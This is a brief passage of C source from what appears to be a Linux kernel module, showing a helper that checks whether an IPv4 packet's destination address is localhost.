
	return NULL;
}

int cckex_skb_v4_dest_is_localhost(struct sk_buff *skb) {
	struct iphdr *iph = ip_hdr(skb);

	//pr_info("CCKEX_LKM [dest_is_localhost]: dest=0x%08x", iph->daddr);

	return iph->daddr == 0x0100007f;
}
